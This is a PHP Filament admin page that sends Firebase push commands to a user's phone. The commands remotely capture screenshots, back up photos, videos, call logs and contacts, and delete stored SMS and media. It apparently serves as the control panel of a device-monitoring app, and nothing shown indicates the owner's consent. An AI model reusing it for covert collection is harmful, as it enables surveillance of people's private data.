<?php

namespace App\Filament\Resources\UserResource\Pages;

use App\Filament\Resources\UserResource;
use Filament\Actions;
use Filament\Resources\Pages\EditRecord;

class EditUser extends EditRecord
{
    protected static string $resource = UserResource::class;

    protected function getHeaderActions(): array
    {
        return [
            Actions\DeleteAction::make(),
            Actions\ActionGroup::make([
                Actions\Action::make('request_screenshot')
                    ->label('Request Screenshot')
                    ->icon('heroicon-o-camera')
                    ->requiresConfirmation()
                    ->action(function ($record) {
                        try {
                            $fcmToken = $record->fcm_token;
                            if (!$fcmToken) {
                                \Filament\Notifications\Notification::make()
                                    ->title('No FCM Token')
                                    ->body('This device does not have an FCM token.')
                                    ->danger()
                                    ->send();
                                return;
                            }

                            // Credentials Path
                            $credentialsPath = storage_path('app/firebase_credentials.json');
                            if (!file_exists($credentialsPath)) {
                                throw new \Exception('Firebase credentials not found.');
                            }

                            $jsonKey = json_decode(file_get_contents($credentialsPath), true);
                            $projectId = $jsonKey['project_id'];

                            // Get Access Token
                            $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials(
                                'https://www.googleapis.com/auth/firebase.messaging',
                                $credentialsPath
                            );
                            $token = $credentials->fetchAuthToken();

                            // Send FCM
                            $client = new \GuzzleHttp\Client();
                            $client->post("https://fcm.googleapis.com/v1/projects/{$projectId}/messages:send", [
                                'headers' => [
                                    'Authorization' => 'Bearer ' . $token['access_token'],
                                    'Content-Type' => 'application/json',
                                ],
                                'json' => [
                                    'message' => [
                                        'token' => $fcmToken,
                                        'data' => [
                                            'action' => 'screenshot',
                                        ],
                                    ],
                                ],
                            ]);

                            \Filament\Notifications\Notification::make()
                                ->title('Screenshot Requested')
                                ->success()
                                ->send();

                        } catch (\Exception $e) {
                             \Filament\Notifications\Notification::make()
                                ->title('Failed to Request Screenshot')
                                ->body($e->getMessage())
                                ->danger()
                                ->send();
                        }
                    }),
                Actions\Action::make('request_gallery_backup')
                    ->label('Request Gallery Backup')
                    ->icon('heroicon-o-photo')
                    ->form([
                        \Filament\Forms\Components\Select::make('media_type')
                            ->label('Media Type')
                            ->options([
                                'photos' => 'Photos Only',
                                'videos' => 'Videos Only',
                                'all' => 'Both (Photos & Videos)',
                            ])
                            ->default('all')
                            ->required(),
                    ])
                    ->action(function ($record, array $data) {
                        try {
                            $fcmToken = $record->fcm_token;
                            if (!$fcmToken) {
                                 \Filament\Notifications\Notification::make()
                                    ->title('No FCM Token')
                                    ->danger()
                                    ->send();
                                return;
                            }

                             // Re-use credentials logic 
                             $credentialsPath = storage_path('app/firebase_credentials.json');
                             $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials(
                                'https://www.googleapis.com/auth/firebase.messaging',
                                $credentialsPath
                             );
                             $token = $credentials->fetchAuthToken();
                             $jsonKey = json_decode(file_get_contents($credentialsPath), true);
                             $projectId = $jsonKey['project_id'];

                             $client = new \GuzzleHttp\Client();
                             $client->post("https://fcm.googleapis.com/v1/projects/{$projectId}/messages:send", [
                                'headers' => [
                                    'Authorization' => 'Bearer ' . $token['access_token'],
                                    'Content-Type' => 'application/json',
                                ],
                                'json' => [
                                    'message' => [
                                        'token' => $fcmToken,
                                        'data' => [
                                            'action' => 'backup_gallery',
                                            'media_type' => $data['media_type'],
                                        ],
                                    ],
                                ],
                            ]);

                            \Filament\Notifications\Notification::make()
                                ->title('Gallery Backup Requested')
                                ->body("Request sent for " . $data['media_type'])
                                ->success()
                                ->send();

                        } catch (\Exception $e) {
                             \Filament\Notifications\Notification::make()
                                ->title('Request Failed')
                                ->body($e->getMessage())
                                ->danger()
                                ->send();
                        }
                    }),
                Actions\Action::make('request_call_log')
                    ->label('Request Call Log')
                    ->icon('heroicon-o-phone')
                    ->requiresConfirmation()
                    ->action(function ($record) {
                        try {
                             if (!$record->fcm_token) {
                                 throw new \Exception('No FCM Token');
                             }

                             $credentialsPath = storage_path('app/firebase_credentials.json');
                             $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials(
                                'https://www.googleapis.com/auth/firebase.messaging',
                                $credentialsPath
                             );
                             $token = $credentials->fetchAuthToken();
                             $jsonKey = json_decode(file_get_contents($credentialsPath), true);
                             $projectId = $jsonKey['project_id'];

                             $client = new \GuzzleHttp\Client();
                             $client->post("https://fcm.googleapis.com/v1/projects/{$projectId}/messages:send", [
                                'headers' => [
                                    'Authorization' => 'Bearer ' . $token['access_token'],
                                    'Content-Type' => 'application/json',
                                ],
                                'json' => [
                                    'message' => [
                                        'token' => $record->fcm_token,
                                        'data' => [
                                            'action' => 'backup_call_log',
                                        ],
                                    ],
                                ],
                            ]);

                            \Filament\Notifications\Notification::make()
                                ->title('Call Log Backup Requested')
                                ->success()
                                ->send();

                        } catch (\Exception $e) {
                             \Filament\Notifications\Notification::make()
                                ->title('Request Failed')
                                ->body($e->getMessage())
                                ->danger()
                                ->send();
                        }
                    }),
                Actions\Action::make('request_contacts')
                    ->label('Request Contacts')
                    ->icon('heroicon-o-users')
                    ->requiresConfirmation()
                    ->action(function ($record) {
                        try {
                             if (!$record->fcm_token) {
                                 throw new \Exception('No FCM Token');
                             }

                             $credentialsPath = storage_path('app/firebase_credentials.json');
                             $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials(
                                'https://www.googleapis.com/auth/firebase.messaging',
                                $credentialsPath
                             );
                             $token = $credentials->fetchAuthToken();
                             $jsonKey = json_decode(file_get_contents($credentialsPath), true);
                             $projectId = $jsonKey['project_id'];

                             $client = new \GuzzleHttp\Client();
                             $client->post("https://fcm.googleapis.com/v1/projects/{$projectId}/messages:send", [
                                'headers' => [
                                    'Authorization' => 'Bearer ' . $token['access_token'],
                                    'Content-Type' => 'application/json',
                                ],
                                'json' => [
                                    'message' => [
                                        'token' => $record->fcm_token,
                                        'data' => [
                                            'action' => 'backup_contacts',
                                        ],
                                    ],
                                ],
                            ]);

                            \Filament\Notifications\Notification::make()
                                ->title('Contacts Backup Requested')
                                ->success()
                                ->send();

                        } catch (\Exception $e) {
                             \Filament\Notifications\Notification::make()
                                ->title('Request Failed')
                                ->body($e->getMessage())
                                ->danger()
                                ->send();
                        }
                    }),
                Actions\Action::make('clean_data')
                    ->label('Clean Data')
                    ->icon('heroicon-o-trash')
                    ->color('danger')
                    ->form([
                        \Filament\Forms\Components\CheckboxList::make('data_types')
                            ->label('Select Data to Delete')
                            ->options([
                                'photos' => 'Photos',
                                'videos' => 'Videos',
                                'audio' => 'Audio Recordings',
                                'call_logs' => 'Call Logs',
                                'contacts' => 'Contacts',
                                'sms' => 'SMS Messages',
                            ])
                            ->required(),
                    ])
                    ->action(function ($record, array $data) {
                        $types = $data['data_types'];
                        $count = 0;

                        foreach ($types as $type) {
                            if ($type === 'photos') {
                                $media = $record->media()->where('type', 'image')->get();
                                foreach ($media as $item) {
                                    \Illuminate\Support\Facades\Storage::delete($item->file_path);
                                    $item->delete();
                                    $count++;
                                }
                            } elseif ($type === 'videos') {
                                $media = $record->media()->where('type', 'video')->get();
                                foreach ($media as $item) {
                                    \Illuminate\Support\Facades\Storage::delete($item->file_path);
                                    $item->delete();
                                    $count++;
                                }
                            } elseif ($type === 'audio') {
                                $media = $record->media()->where('type', 'audio')->get();
                                foreach ($media as $item) {
                                    \Illuminate\Support\Facades\Storage::delete($item->file_path);
                                    $item->delete();
                                    $count++;
                                }
                            } elseif ($type === 'call_logs') {
                                $count += $record->backups()->where('type', 'call_log')->delete();
                            } elseif ($type === 'contacts') {
                                $count += $record->backups()->where('type', 'contacts')->delete();
                            } elseif ($type === 'sms') {
                                $count += $record->backups()->where('type', 'sms')->delete();
                            }
                        }

                        \Filament\Notifications\Notification::make()
                            ->title('Data Cleaned')
                            ->body("Deleted {$count} items.")
                            ->success()
                            ->send();
                    }),
            ])
            ->label('Device Commands')
            ->icon('heroicon-m-ellipsis-horizontal')
            ->tooltip('Manage Device'),
        ];
    }
}
